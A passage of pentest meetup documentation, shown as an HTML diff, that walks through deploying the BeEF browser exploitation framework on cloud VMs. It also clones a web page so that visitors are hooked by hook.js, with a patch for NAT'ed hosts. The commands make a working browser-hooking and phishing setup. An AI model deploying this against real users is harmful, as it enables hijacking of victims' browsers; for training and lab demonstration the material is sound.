+</span><span class="hll"><span class="nv">$SUDO</span> chmod <span class="m">770</span> /etc/authbind/byport/443
+</span><span class="hll">
+</span><span class="hll"><span class="c1"># install, setup BeEF</span>
+</span><span class="hll"><span class="nv">$SUDO</span> apt-get install gnupg2 -y
+</span><span class="hll">gpg2 --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
+</span><span class="hll">curl -sSL https://raw.githubusercontent.com/wayneeseguin/rvm/master/binscripts/rvm-installer <span class="se">\</span>
+</span><span class="hll">    <span class="p">|</span> bash -s stable
+</span><span class="hll"><span class="nb">source</span> ~/.rvm/scripts/rvm
+</span><span class="hll">rvm install <span class="m">2</span>.1.5
+</span><span class="hll">rvm use <span class="m">2</span>.1.5 -- default
+</span><span class="hll">gem install bundler
+</span><span class="hll">git clone git://github.com/beefproject/beef.git
+</span><span class="hll"><span class="nb">cd</span> beef
+</span><span class="hll"><span class="c1"># edit config.yaml to change</span>
+</span><span class="hll"><span class="c1">#   beef:http:host from &quot;0.0.0.0&quot; to &quot;$FQDN&quot;</span>
+</span><span class="hll"><span class="c1">#   beef:http:port from &quot;3000&quot; to &quot;443&quot;</span>
+</span><span class="hll"><span class="c1">#   userid/password from beef/beef to lethal/beef-test</span>
+</span><span class="hll"><span class="c1">#   https: enable: true</span>
+</span><span class="hll">mv config.yaml config.yaml.orig
+</span><span class="hll">cp config.yaml.orig config.yaml
+</span><span class="hll">sed -i -e <span class="s1">&#39;s/host: &quot;0.0.0.0&quot;/host: &quot;&#39;</span><span class="nv">$FQDN</span><span class="s1">&#39;&quot;/&#39;</span>  config.yaml
+</span><span class="hll">sed -i -e <span class="s1">&#39;s/port: &quot;3000&quot;/port: &quot;&#39;</span><span class="m">443</span><span class="s1">&#39;&quot;/&#39;</span>  config.yaml
+</span><span class="hll">sed -i -e <span class="s1">&#39;s/user:   &quot;beef&quot;/user:   &quot;&#39;</span><span class="s2">&quot;</span><span class="nv">$BEEF_USER</span><span class="s2">&quot;</span><span class="s1">&#39;&quot;/&#39;</span>  config.yaml
+</span><span class="hll">sed -i -e <span class="s1">&#39;s/passwd: &quot;beef&quot;/passwd: &quot;&#39;</span><span class="s2">&quot;</span><span class="nv">$BEEF_PW</span><span class="s2">&quot;</span><span class="s1">&#39;&quot;/&#39;</span>  config.yaml
+</span><span class="hll"><span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$HTTP</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;https&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> sed -i -e <span class="s1">&#39;/https:/{n;s/false/true/}&#39;</span> config.yaml
+</span><span class="hll">bundle install
+</span><span class="hll">nohup authbind ruby beef <span class="p">&amp;</span>
+</span><span class="hll"><span class="c1"># when done, stop BeEF via</span>
+</span><span class="hll"><span class="c1">#   kill -INT $(ps -C ruby -o pid=)</span>
+</span></pre></div>
+</div>
+</div>
+<div class="section" id="clone-page">
+<h3>6.2.4.2. Clone_page<a class="headerlink" href="#clone-page" title="Permalink to this headline">¶</a></h3>
+<p>Continue on from the session above to clone <a class="reference external" href="https://pentest-meetup.appspot.com/html/index.html">https://pentest-meetup.appspot.com/html/index.html</a>:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="hll"><span class="nv">BEEF_IPP</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$FQDN</span><span class="s2">&quot;</span>
+</span><span class="hll"><span class="nv">BEEF_USER</span><span class="o">=</span><span class="s2">&quot;lethal&quot;</span>
+</span><span class="hll"><span class="nv">BEEF_PW</span><span class="o">=</span><span class="s2">&quot;beef-test&quot;</span>
+</span><span class="hll"><span class="nv">HTTP</span><span class="o">=</span>https
+</span><span class="hll"><span class="c1"># clone_page https://pentest-meetup.appspot.com/html/index.html</span>
+</span><span class="hll"><span class="c1">#   first get the API token needed for authentication</span>
+</span><span class="hll"><span class="nv">DATA</span><span class="o">=</span><span class="s1">&#39;{&quot;username&quot;:&quot;&#39;</span><span class="s2">&quot;</span><span class="nv">$BEEF_USER</span><span class="s2">&quot;</span><span class="s1">&#39;&quot;, &quot;password&quot;:&quot;&#39;</span><span class="s2">&quot;</span><span class="nv">$BEEF_PW</span><span class="s2">&quot;</span><span class="s1">&#39;&quot;}&#39;</span>
+</span><span class="hll"><span class="nv">RESPONSE</span><span class="o">=</span><span class="k">$(</span>curl --silent --insecure --request POST <span class="se">\</span>
+</span><span class="hll">               --header <span class="s2">&quot;Content-Type: application/json&quot;</span> <span class="se">\</span>
+</span><span class="hll">               --data <span class="s2">&quot;</span><span class="nv">$DATA</span><span class="s2">&quot;</span> <span class="se">\</span>
+</span><span class="hll">            <span class="nv">$HTTP</span>://<span class="nv">$BEEF_IPP</span>/api/admin/login<span class="k">)</span>
+</span><span class="nv">SUCCESS</span><span class="o">=</span><span class="si">${</span><span class="nv">RESPONSE</span><span class="p">#*</span><span class="se">\&quot;</span><span class="nv">success</span><span class="se">\&quot;</span><span class="p">:</span><span class="si">}</span>
+<span class="nv">SUCCESS</span><span class="o">=</span><span class="si">${</span><span class="nv">SUCCESS</span><span class="p">%%,*</span><span class="si">}</span>
+<span class="hll"><span class="nb">echo</span> <span class="nv">SUCCESS</span><span class="o">=</span><span class="nv">$SUCCESS</span>
+</span><span class="nv">TOKEN</span><span class="o">=</span><span class="si">${</span><span class="nv">RESPONSE</span><span class="p">#*</span><span class="se">\&quot;</span><span class="nv">token</span><span class="se">\&quot;</span><span class="p">:</span><span class="se">\&quot;</span><span class="si">}</span>
+<span class="nv">TOKEN</span><span class="o">=</span><span class="si">${</span><span class="nv">TOKEN</span><span class="p">%%</span><span class="se">\&quot;</span><span class="p">*</span><span class="si">}</span>
+<span class="hll"><span class="nb">echo</span> <span class="nv">TOKEN</span><span class="o">=</span><span class="nv">$TOKEN</span>
+</span>
+<span class="hll"><span class="c1">#   now use the token to clone_page</span>
+</span><span class="hll">curl --insecure --header <span class="s2">&quot;Content-Type: application/json; charset=UTF-8&quot;</span>  <span class="se">\</span>
+</span><span class="hll">     --data <span class="s1">&#39;{&quot;url&quot;:&quot;https://pentest-meetup.appspot.com/html/index.html&quot;, &quot;mount&quot;:&quot;/html/index.html&quot;}&#39;</span> <span class="se">\</span>
+</span><span class="hll">     --request POST <span class="nv">$HTTP</span>://<span class="nv">$BEEF_IPP</span>/api/seng/clone_page?token<span class="o">=</span><span class="nv">$TOKEN</span>
+</span></pre></div>
+</div>
+<p>At this point the web page has been cloned on the BeEF server and you can open the web page $HTTP://$FQDN/html/index.html to get hooked.</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>curl --silent --insecure https://<span class="nv">$FQDN</span>/html/index.html <span class="p">|</span> grep hook.js
+</pre></div>
+</div>
+</div>
+</div>
+<div class="section" id="google-compute-engine-beef-clone-page-example">
+<h2>6.2.5. Google Compute Engine BeEF clone_page example<a class="headerlink" href="#google-compute-engine-beef-clone-page-example" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="external-vs-internal-ip">
+<h3>6.2.5.1. External vs internal IP<a class="headerlink" href="#external-vs-internal-ip" title="Permalink to this headline">¶</a></h3>
+<p>Here is the Google Compute Engine (GCE) version of the DigitalOcean clone_page example. This illustrates setting up BeEF behind a NAT’ed server: DigitalOcean’s sole network interface uses the VM’s external IP (simplifying the setup), whereas GCE’s sole network interface uses the VM’s internal IP address. For configuration this means for DigitalOcean’s <code class="file docutils literal"><span class="pre">config.yaml</span></code> uses:</p>
+<div class="highlight-yaml"><div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">beef</span><span class="p p-Indicator">:</span>
+     <span class="l l-Scalar l-Scalar-Plain">http</span><span class="p p-Indicator">:</span>
+         <span class="l l-Scalar l-Scalar-Plain">host</span><span class="p p-Indicator">:</span> <span class="s">&quot;EXTERNAL_IP_OR_FQDN&quot;</span>
+         <span class="l l-Scalar l-Scalar-Plain">port</span><span class="p p-Indicator">:</span> <span class="s">&quot;EXTERNAL_PORT&quot;</span>
+</pre></div>
+</div>
+<p>But GCE needs to handle the NAT so <code class="file docutils literal"><span class="pre">config.yaml</span></code> uses:</p>
+<div class="highlight-yaml"><div class="highlight"><pre><span></span><span class="l l-Scalar l-Scalar-Plain">beef</span><span class="p p-Indicator">:</span>
+     <span class="l l-Scalar l-Scalar-Plain">http</span><span class="p p-Indicator">:</span>
+         <span class="l l-Scalar l-Scalar-Plain">host</span><span class="p p-Indicator">:</span> <span class="s">&quot;INTERNAL_IP_OR_FQDN&quot;</span>
+         <span class="l l-Scalar l-Scalar-Plain">port</span><span class="p p-Indicator">:</span> <span class="s">&quot;INTERNAL_PORT&quot;</span>
+         <span class="l l-Scalar l-Scalar-Plain">public</span><span class="p p-Indicator">:</span> <span class="s">&quot;EXTERNAL_IP_OR_FQDN&quot;</span>
+         <span class="l l-Scalar l-Scalar-Plain">public_port</span><span class="p p-Indicator">:</span> <span class="s">&quot;EXTERNAL_PORT&quot;</span>
+</pre></div>
+</div>
+<p>Complicating this is the fact that currently BeEF’s <a class="reference external" href="https://github.com/beefproject/beef/blob/master/extensions/social_engineering/web_cloner/web_cloner.rb">web_clone.rb</a> has a bug in generating the &lt;script&gt; tag for <strong class="program">hook.js</strong> in that it uses <code class="docutils literal"><span class="pre">beef:http:host</span></code> and <code class="docutils literal"><span class="pre">beef:http:port</span></code>; for GCE this is the non-routable internal IP which cannot be access by the victim making it impossible to hook any client. Here’s the <a class="reference external" href="https://github.com/beefproject/beef/blob/master/extensions/social_engineering/web_cloner/web_cloner.rb">web_clone.rb</a> before code:</p>
+<div class="highlight-ruby"><div class="highlight"><pre><span></span><span class="n">beef_proto</span> <span class="o">=</span> <span class="vi">@config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;beef.http.https.enable&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="kp">true</span> <span class="p">?</span> <span class="s2">&quot;https&quot;</span> <span class="p">:</span> <span class="s2">&quot;http&quot;</span>
+<span class="vi">@beef_hook</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">#{</span><span class="n">beef_proto</span><span class="si">}</span><span class="s2">://</span><span class="si">#{</span><span class="vi">@config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;beef.http.host&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="vi">@config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;beef.http.port&#39;</span><span class="p">)</span><span class="si">}#{</span><span class="vi">@config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;beef.http.hook_file&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span>
+</pre></div>
+</div>
+<p>and while this is not an official fix, this code makes GCE work:</p>
+<div class="highlight-ruby"><div class="highlight"><pre><span></span><span class="n">beef_proto</span> <span class="o">=</span> <span class="vi">@config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;beef.http.https.enable&quot;</span><span class="p">)</span> <span class="o">==</span> <span class="kp">true</span> <span class="p">?</span> <span class="s2">&quot;https&quot;</span> <span class="p">:</span> <span class="s2">&quot;http&quot;</span>
+<span class="n">beef_host</span> <span class="o">=</span> <span class="vi">@config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;beef.http.public&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="kp">nil</span> <span class="p">?</span> <span class="vi">@config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;beef.http.public&quot;</span><span class="p">)</span> <span class="p">:</span> <span class="vi">@config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;beef.http.host&#39;</span><span class="p">)</span>
+<span class="n">beef_port</span> <span class="o">=</span> <span class="vi">@config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;beef.http.public_port&quot;</span><span class="p">)</span> <span class="o">!=</span> <span class="kp">nil</span> <span class="p">?</span> <span class="vi">@config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&quot;beef.http.public_port&quot;</span><span class="p">)</span> <span class="p">:</span> <span class="vi">@config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;beef.http.port&#39;</span><span class="p">)</span>
+<span class="vi">@beef_hook</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">#{</span><span class="n">beef_proto</span><span class="si">}</span><span class="s2">://</span><span class="si">#{</span><span class="n">beef_host</span><span class="si">}</span><span class="s2">:</span><span class="si">#{</span><span class="n">beef_port</span><span class="si">}#{</span><span class="vi">@config</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;beef.http.hook_file&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span>
+</pre></div>
+</div>
+<p>To generate a patch file for application later we run:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span>git diff extensions/social_engineering/web_cloner/web_cloner.rb &gt; patch.diff
+<span class="c1"># Later apply patch via:</span>
+<span class="c1">#  git apply patch.diff</span>
+</pre></div>
+</div>
+<p>The actual patch is:</p>
+<div class="highlight-diff"><div class="highlight"><pre><span></span><span class="gh">diff --git a/extensions/social_engineering/web_cloner/web_cloner.rb b/extensions/social_engineering/web_cloner/web_cloner.rb</span>
+<span class="gh">index 5ef7083..d0f9203 100644</span>
+<span class="gd">--- a/extensions/social_engineering/web_cloner/web_cloner.rb</span>
+<span class="gi">+++ b/extensions/social_engineering/web_cloner/web_cloner.rb</span>
+<span class="gu">@@ -15,7 +15,9 @@ module BeEF</span>
+           @config = BeEF::Core::Configuration.instance
+           @cloned_pages_dir = &quot;#{File.expand_path(&#39;../../../../extensions/social_engineering/web_cloner&#39;, __FILE__)}/cloned_pages/&quot;
+           beef_proto = @config.get(&quot;beef.http.https.enable&quot;) == true ? &quot;https&quot; : &quot;http&quot;
+<span class="gd">-          @beef_hook = &quot;#{beef_proto}://#{@config.get(&#39;beef.http.host&#39;)}:#{@config.get(&#39;beef.http.port&#39;)}#{@config.get(&#39;beef.http.hook_file&#39;)}&quot;</span>
+<span class="gi">+          beef_host = @config.get(&quot;beef.http.public&quot;) != nil ? @config.get(&quot;beef.http.public&quot;) : @config.get(&#39;beef.http.host&#39;)</span>
+<span class="gi">+          beef_port = @config.get(&quot;beef.http.public_port&quot;) != nil ? @config.get(&quot;beef.http.public_port&quot;) : @config.get(&#39;beef.http.port&#39;)</span>
+<span class="gi">+          @beef_hook = &quot;#{beef_proto}://#{beef_host}:#{beef_port}#{@config.get(&#39;beef.http.hook_file&#39;)}&quot;</span>
+         end
+
+         def clone_page(url, mount, use_existing, dns_spoof)
+</pre></div>
+</div>
+</div>
+<div class="section" id="id7">
+<h3>6.2.5.2. Server setup<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h3>
+<p>Here is the command-line level for setting up a GCE BeEF instance. We’ll leave out the details of setting up a GCE account, installing <a class="reference external" href="https://cloud.google.com/sdk/">Google Cloud SDK</a>, setting up DNS (you could hack your /etc/hosts file), … .</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># *******************************</span>
+<span class="c1"># *******************************</span>
+<span class="c1"># Exploiter host steps</span>
+<span class="c1">#   Create GCE instance</span>
+<span class="c1">#   ssh to instance</span>
+<span class="c1"># *******************************</span>
+<span class="c1"># *******************************</span>
+
+<span class="c1"># Google-isms</span>
+<span class="nv">PROJECT</span><span class="o">=</span><span class="s2">&quot;bitbender.org:bitbender&quot;</span>
+<span class="nv">ZONE</span><span class="o">=</span><span class="s2">&quot;us-central1-c&quot;</span>
+<span class="nv">MACHINE</span><span class="o">=</span><span class="s2">&quot;f1-micro&quot;</span>
+<span class="nv">IMAGE</span><span class="o">=</span><span class="s2">&quot;https://www.googleapis.com/compute/v1/projects/debian-cloud/global/images/backports-debian-7-wheezy-v20150423&quot;</span>
+<span class="nv">INSTANCE</span><span class="o">=</span><span class="s2">&quot;pentest-meetup&quot;</span>
+<span class="nv">TAG</span><span class="o">=</span>beef
+<span class="c1"># Use this DNS name (put in DNS or /etc/hosts on remote machines)</span>
+<span class="nv">DOMAIN</span><span class="o">=</span><span class="s2">&quot;gce.bitbender.org&quot;</span>
+<span class="nv">FQDN</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$INSTANCE</span><span class="s2">.</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span>
+<span class="c1"># Create SSH key (or use existing one)</span>
+<span class="nv">VMUSER</span><span class="o">=</span>hacker
+<span class="nv">EMAIL</span><span class="o">=</span><span class="s2">&quot;hacker@</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span>
+<span class="nv">SSH_PRIV_FILE</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$HOME</span><span class="s2">/.ssh/id_rsa_gce&quot;</span>
+<span class="nv">SSH_PUB_FILE</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$SSH_PRIV_FILE</span><span class="s2">.pub&quot;</span>
+<span class="c1"># enter a password</span>
+ssh-keygen -t rsa -b <span class="m">4096</span> -C <span class="s2">&quot;</span><span class="nv">$EMAIL</span><span class="s2">&quot;</span> -f <span class="nv">$SSH_PRIV_FILE</span>
+<span class="nv">SSH_PUB_KEY</span><span class="o">=</span><span class="s2">&quot;</span><span class="k">$(</span>cat <span class="nv">$SSH_PUB_FILE</span><span class="k">)</span><span class="s2">&quot;</span>
+
+<span class="c1"># Set project and zone</span>
+gcloud config <span class="nb">set</span> project <span class="nv">$PROJECT</span>
+gcloud config <span class="nb">set</span> compute/zone <span class="nv">$ZONE</span>
+
+<span class="c1"># See existing instances</span>
+gcloud compute instances list
+
+<span class="c1"># Add beef firewall tag</span>
+<span class="c1"># NOTE: more ports needed as more BeEF ports used</span>
+gcloud compute firewall-rules list
+gcloud compute firewall-rules delete beef-local --quiet
+gcloud compute firewall-rules create beef-local --network default <span class="se">\</span>
+    --allow udp:5300,tcp:6789 --source-ranges <span class="m">127</span>.0.0.1 --target-tags <span class="nv">$TAG</span>
+gcloud compute firewall-rules delete beef-external --quiet
+gcloud compute firewall-rules create beef-external --network default <span class="se">\</span>
+    --allow udp:5300,tcp:80,tcp:443,tcp:2000,tcp:3000 --target-tags <span class="nv">$TAG</span>
+gcloud compute firewall-rules list
+
+<span class="c1"># Create instance using beef firewall tag</span>
+gcloud compute --project <span class="s2">&quot;</span><span class="nv">$PROJECT</span><span class="s2">&quot;</span> <span class="se">\</span>
+    instances create <span class="s2">&quot;</span><span class="nv">$INSTANCE</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --zone <span class="s2">&quot;</span><span class="nv">$ZONE</span><span class="s2">&quot;</span> --machine-type <span class="s2">&quot;</span><span class="nv">$MACHINE</span><span class="s2">&quot;</span> --network <span class="s2">&quot;default&quot;</span> <span class="se">\</span>
+    --maintenance-policy <span class="s2">&quot;MIGRATE&quot;</span> <span class="se">\</span>
+    --scopes<span class="o">=</span>https://www.googleapis.com/auth/devstorage.read_only,https://www.googleapis.com/auth/logging.write <span class="se">\</span>
+    --tags<span class="o">=</span><span class="nv">$TAG</span> <span class="se">\</span>
+    --image <span class="s2">&quot;</span><span class="nv">$IMAGE</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --boot-disk-type <span class="s2">&quot;pd-standard&quot;</span> <span class="se">\</span>
+    --boot-disk-device-name <span class="s2">&quot;</span><span class="nv">$INSTANCE</span><span class="s2">&quot;</span> <span class="se">\</span>
+    --metadata <span class="s2">&quot;sshKeys=</span><span class="nv">$VMUSER</span><span class="s2">:</span><span class="nv">$SSH_PUB_KEY</span><span class="s2">&quot;</span>
+
+<span class="c1"># Wait for it to start then get external and internal IPs</span>
+gcloud compute instances list
+
+<span class="c1"># Here goes the external and internal IPs</span>
+<span class="nv">EXT_IP</span><span class="o">=</span><span class="m">23</span>.236.54.36
+<span class="c1"># Remove external IP from known_hosts</span>
+ssh-keygen -f <span class="s2">&quot;</span><span class="nv">$HOME</span><span class="s2">/.ssh/known_hosts&quot;</span> -R <span class="nv">$EXT_IP</span>
+<span class="c1"># Add IP to /etc/hosts if not part of DNS</span>
+<span class="c1"># echo &quot;$NAT  $FQDN&quot; &gt;&gt; /etc/hosts</span>
+<span class="nv">INT_IP</span><span class="o">=</span><span class="m">10</span>.240.52.147
+ssh-add <span class="nv">$SSH_PRIV_FILE</span>
+
+<span class="c1"># Log into GCE instance (no password needed)</span>
+ssh <span class="nv">$VMUSER</span>@<span class="nv">$EXT_IP</span>
+</pre></div>
+</div>
+<p>Now that you’re on the VM:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># *******************************</span>
+<span class="c1"># *******************************</span>
+<span class="c1"># GCE steps</span>
+<span class="c1"># *******************************</span>
+<span class="c1"># *******************************</span>
+
+<span class="c1"># Set up variables again ...</span>
+<span class="c1"># REMEMBER TO CHANGE THE IPs</span>
+<span class="nv">EXT_IP</span><span class="o">=</span><span class="m">23</span>.236.54.36
+<span class="nv">INT_IP</span><span class="o">=</span><span class="m">10</span>.240.52.147
+<span class="nv">VMUSER</span><span class="o">=</span>hacker
+<span class="nv">INSTANCE</span><span class="o">=</span><span class="s2">&quot;pentest-meetup&quot;</span>
+<span class="nv">DOMAIN</span><span class="o">=</span><span class="s2">&quot;gce.bitbender.org&quot;</span>
+<span class="nv">FQDN</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$INSTANCE</span><span class="s2">.</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span>
+
+<span class="c1"># More variables</span>
+<span class="nv">BEEF_IPP</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$FQDN</span><span class="s2">&quot;</span>
+<span class="nv">BEEF_USER</span><span class="o">=</span><span class="s2">&quot;lethal&quot;</span>
+<span class="nv">BEEF_PW</span><span class="o">=</span><span class="s2">&quot;beef-test&quot;</span>
+<span class="nv">HTTP</span><span class="o">=</span>https
+<span class="nv">SUDO</span><span class="o">=</span><span class="s2">&quot;</span><span class="k">$(</span>which sudo<span class="k">)</span><span class="s2">&quot;</span>
+<span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">&quot;</span> <span class="o">==</span> <span class="s2">&quot;root&quot;</span> <span class="o">]]</span> <span class="o">&amp;&amp;</span> <span class="nv">SUDO</span><span class="o">=</span>
+<span class="nv">$SUDO</span> date
+
+<span class="c1"># Install needed software and set up authbind to allow binding to low port numbers</span>
+<span class="nv">$SUDO</span> apt-get update
+<span class="nv">$SUDO</span> apt-get install curl git -y
+<span class="nv">$SUDO</span> apt-get install authbind -y
+<span class="nv">$SUDO</span> touch /etc/authbind/byport/80
+<span class="nv">$SUDO</span> chgrp <span class="nv">$VMUSER</span> /etc/authbind/byport/80
+<span class="nv">$SUDO</span> chmod <span class="m">770</span> /etc/authbind/byport/80
+<span class="nv">$SUDO</span> touch /etc/authbind/byport/443
+<span class="nv">$SUDO</span> chgrp <span class="nv">$VMUSER</span> /etc/authbind/byport/443
+<span class="nv">$SUDO</span> chmod <span class="m">770</span> /etc/authbind/byport/443
+<span class="nv">$SUDO</span> apt-get install gnupg2 -y
+gpg2 --keyserver hkp://keys.gnupg.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3
+curl -sSL https://raw.githubusercontent.com/wayneeseguin/rvm/master/binscripts/rvm-installer <span class="se">\</span>
+    <span class="p">|</span> bash -s stable
+<span class="nb">source</span> ~/.rvm/scripts/rvm
+rvm install <span class="m">2</span>.1.5
+rvm use <span class="m">2</span>.1.5 -- default
+gem install bundler
+git clone git://github.com/beefproject/beef.git
+<span class="nb">cd</span> beef
+<span class="c1"># patch web_cloner.rb</span>
+cat &gt; patch.diff <span class="s">&lt;&lt;EOF</span>
+<span class="s">diff --git a/extensions/social_engineering/web_cloner/web_cloner.rb b/extensions/social_engineering/web_cloner/web_cloner.rb</span>
+<span class="s">index 5ef7083..d0f9203 100644</span>
+<span class="s">--- a/extensions/social_engineering/web_cloner/web_cloner.rb</span>
+<span class="s">+++ b/extensions/social_engineering/web_cloner/web_cloner.rb</span>
+<span class="s">@@ -15,7 +15,9 @@ module BeEF</span>
+<span class="s">           @config = BeEF::Core::Configuration.instance</span>
+<span class="s">           @cloned_pages_dir = &quot;#{File.expand_path(&#39;../../../../extensions/social_engineering/web_cloner&#39;, __FILE__)}/cloned_pages/&quot;</span>
+<span class="s">           beef_proto = @config.get(&quot;beef.http.https.enable&quot;) == true ? &quot;https&quot; : &quot;http&quot;</span>
+<span class="s">-          @beef_hook = &quot;#{beef_proto}://#{@config.get(&#39;beef.http.host&#39;)}:#{@config.get(&#39;beef.http.port&#39;)}#{@config.get(&#39;beef.http.hook_file&#39;)}&quot;</span>
+<span class="s">+          beef_host = @config.get(&quot;beef.http.public&quot;) != nil ? @config.get(&quot;beef.http.public&quot;) : @config.get(&#39;beef.http.host&#39;)</span>
+<span class="s">+          beef_port = @config.get(&quot;beef.http.public_port&quot;) != nil ? @config.get(&quot;beef.http.public_port&quot;) : @config.get(&#39;beef.http.port&#39;)</span>
+<span class="s">+          @beef_hook = &quot;#{beef_proto}://#{beef_host}:#{beef_port}#{@config.get(&#39;beef.http.hook_file&#39;)}&quot;</span>
+<span class="s">         end</span>
+
+<span class="s">         def clone_page(url, mount, use_existing, dns_spoof)</span>
+<span class="s">EOF</span>
+git apply patch.diff
+<span class="c1"># edit config.yaml</span>
+<span class="o">[[</span> ! -e config.yaml.orig <span class="o">]]</span> <span class="o">&amp;&amp;</span> mv config.yaml config.yaml.orig
+cp config.yaml.orig config.yaml
+<span class="k">if</span> <span class="o">[[</span> <span class="s2">&quot;</span><span class="nv">$EXT_IP</span><span class="s2">&quot;</span> !<span class="o">=</span> <span class="s2">&quot;</span><span class="nv">$INT_IP</span><span class="s2">&quot;</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
+  sed -i -e <span class="s1">&#39;s/#public: &quot;&quot;/public: &quot;&#39;</span><span class="nv">$FQDN</span><span class="s1">&#39;&quot;/&#39;</span>  config.yaml
+  sed -i -e <span class="s1">&#39;s/#public_port: &quot;&quot;/public_port: &quot;&#39;</span><span class="m">443</span><span class="s1">&#39;&quot;/&#39;</span>  config.yaml
+<span class="k">fi</span>
+sed -i -e <span class="s1">&#39;s/host: &quot;0.0.0.0&quot;/host: &quot;&#39;</span><span class="nv">$INT_IP</span><span class="s1">&#39;&quot;/&#39;</span>  config.yaml
+sed -i -e <span class="s1">&#39;s/port: &quot;3000&quot;/port: &quot;&#39;</span><span class="m">443</span><span class="s1">&#39;&quot;/&#39;</span>  config.yaml
+sed -i -e <span class="s1">&#39;s/user:   &quot;beef&quot;/user:   &quot;&#39;</span><span class="s2">&quot;</span><span class="nv">$BEEF_USER</span><span class="s2">&quot;</span><span class="s1">&#39;&quot;/&#39;</span>  config.yaml
+sed -i -e <span class="s1">&#39;s/passwd: &quot;beef&quot;/passwd: &quot;&#39;</span><span class="s2">&quot;</span><span class="nv">$BEEF_PW</span><span class="s2">&quot;</span><span class="s1">&#39;&quot;/&#39;</span>  config.yaml
+sed -i -e <span class="s1">&#39;/https:/{n;s/false/true/}&#39;</span> config.yaml
+<span class="c1"># install beef</span>
+bundle install
+
+<span class="c1"># Now run beef</span>
+<span class="c1">#   see only port 22 listening</span>
+ss -tnl
+nohup authbind ruby beef <span class="p">&amp;</span>
+<span class="c1">#   do this a couple of times to see how fast it starts</span>
+ss -tnl
+<span class="c1"># when done, stop BeEF via</span>
+<span class="c1">#   kill -INT $(ps -C ruby -o pid=)</span>
+<span class="c1"># look at log</span>
+<span class="c1">#   less $HOME/beef/nohup.out</span>
+</pre></div>
+</div>
+<p>Now the BeEF instance is up and running. Continue the demo on your exploit machine.</p>
+</div>
+<div class="section" id="id8">
+<h3>6.2.5.3. Clone_page<a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h3>
+<p>Here is the command-line level for cloning a web page. After this is done you should be able to visit <a class="reference external" href="https://$FQDN/html/index.html">https://$FQDN/html/index.html</a> and get hooked:</p>
+<div class="highlight-bash"><div class="highlight"><pre><span></span><span class="c1"># *******************************</span>
+<span class="c1"># *******************************</span>
+<span class="c1"># Exploiter host steps</span>
+<span class="c1">#   Clone a web site</span>
+<span class="c1"># *******************************</span>
+<span class="c1"># *******************************</span>
+
+<span class="c1"># Set up variables again ...</span>
+<span class="nv">BEEF_IPP</span><span class="o">=</span><span class="s2">&quot;</span><span class="nv">$FQDN</span><span class="s2">&quot;</span>
+<span class="nv">BEEF_USER</span><span class="o">=</span><span class="s2">&quot;lethal&quot;</span>
+<span class="nv">BEEF_PW</span><span class="o">=</span><span class="s2">&quot;beef-test&quot;</span>
+<span class="nv">HTTP</span><span class="o">=</span>https
+<span class="nv">CLONEME</span><span class="o">=</span><span class="s2">&quot;https://pentest-meetup.appspot.com/html/index.html&quot;</span>
+
+<span class="c1"># Get RESTapi TOKEN</span>
+<span class="nv">DATA</span><span class="o">=</span><span class="s1">&#39;{&quot;username&quot;:&quot;&#39;</span><span class="s2">&quot;</span><span class="nv">$BEEF_USER</span><span class="s2">&quot;</span><span class="s1">&#39;&quot;, &quot;password&quot;:&quot;&#39;</span><span class="s2">&quot;</span><span class="nv">$BEEF_PW</span><span class="s2">&quot;</span><span class="s1">&#39;&quot;}&#39;</span>
+<span class="nv">RESPONSE</span><span class="o">=</span><span class="k">$(</span>curl --silent --insecure --request POST <span class="se">\</span>
+               --header <span class="s2">&quot;Content-Type: application/json&quot;</span> <span class="se">\</span>
+               --data <span class="s2">&quot;</span><span class="nv">$DATA</span><span class="s2">&quot;</span> <span class="se">\</span>
